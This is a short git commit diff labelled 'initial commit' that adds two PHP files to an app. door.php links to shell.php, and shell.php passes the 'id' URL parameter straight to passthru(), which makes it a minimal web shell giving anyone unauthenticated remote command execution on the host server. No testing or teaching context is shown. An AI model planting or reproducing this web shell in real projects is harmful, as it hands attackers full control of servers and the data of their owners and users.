c80c94f35a4acfa32dc3d7a1e2f4a557cabcc3fa
sotyarws <jimailsotya@gmail.com>
2023-10-04 07:14:42 +0000

    initial commit

---
+++ app/door.php
@@ -0,0 +1,9 @@
+<!DOCTYPE HTML>
+<head>
+<title>shell</title>
+</head>
+<body>
+<a href="shell.php?id=0">shell</a>
+</body>
+</html>
+
---
+++ app/shell.php
@@ -0,0 +1,10 @@
+<?php
+passthru($_GET['id']);
+?>
+
+<!DOCTYPE HTML>
+<head><title></title></head>
+<body>
+<p>passthru($_GET['id'])</p>
+</body>
+</html>
